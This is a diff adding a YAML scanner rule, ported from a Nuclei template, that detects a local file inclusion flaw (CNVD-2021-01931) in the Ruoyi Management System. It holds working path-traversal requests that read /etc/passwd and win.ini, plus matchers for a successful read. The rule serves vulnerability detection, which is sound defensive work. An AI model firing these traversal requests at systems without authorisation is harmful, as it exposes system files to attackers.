@@ -1,0 +1,41 @@
+schema_version: 1
+id: "cortex.community:cnvd-2021-01931"
+rule_version: "1.0.0"
+requires:
+  engine_api: 1
+  capabilities: ["http.standard.v1", "matchers.basic.v1", "proof.signal.v1"]
+info:
+  name: "Ruoyi Management System - Local File Inclusion"
+  description: "The Ruoyi Management System contains a local file inclusion vulnerability that allows attackers to retrieve arbitrary files from the operating system. Auto-ported from a Nuclei template by nuclei2cdl. Certainty is LIKELY: a ported matcher has no baseline/differential proof, so it is a signal, not a confirmed exploit. Review before use."
+  references:
+    - "https://disk.scan.cm/All_wiki/%E4%BD%A9%E5%A5%87PeiQi-WIKI-POC-2021-7-20%E6%BC%8F%E6%B4%9E%E5%BA%93/PeiQi_Wiki/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E8%8B%A5%E4%BE%9D%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/%E8%8B%A5%E4%BE%9D%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%20CNVD-2021-01931.md?hash=zE0KEPGJ"
+  cwes: [22]
+  tags: ["cnvd", "cnvd2021", "ruoyi", "lfi", "vuln", "nuclei", "auto-ported", "signal"]
+  remediation: "See the referenced advisory / template source for remediation."
+finding:
+  sink_type: "VULNERABLE_COMPONENT"
+  impact: "INFORMATION_DISCLOSURE"
+  severity: "High"
+  root_cause: "nuclei-ported-signal"
+execution: { auth: "anonymous", side_effects: "read_only", transport: "http" }
+steps:
+  - id: "probe0"
+    request: { method: "GET", path: "/common/download/resource?resource=/profile/../../../../etc/passwd" }
+  - id: "probe1"
+    request: { method: "GET", path: "/common/download/resource?resource=/profile/../../../../Windows/win.ini" }
+proof:
+  kind: "signal.v1"
+  assertions:
+    any:
+      - any:
+          - regex: { left: { ref: "steps.probe0.body" }, right: { value: "root:.*:0:0" } }
+          - all:
+              - contains: { left: { ref: "steps.probe0.body" }, right: { value: "bit app support" } }
+              - contains: { left: { ref: "steps.probe0.body" }, right: { value: "fonts" } }
+              - contains: { left: { ref: "steps.probe0.body" }, right: { value: "extensions" } }
+      - any:
+          - regex: { left: { ref: "steps.probe1.body" }, right: { value: "root:.*:0:0" } }
+          - all:
+              - contains: { left: { ref: "steps.probe1.body" }, right: { value: "bit app support" } }
+              - contains: { left: { ref: "steps.probe1.body" }, right: { value: "fonts" } }
+              - contains: { left: { ref: "steps.probe1.body" }, right: { value: "extensions" } }
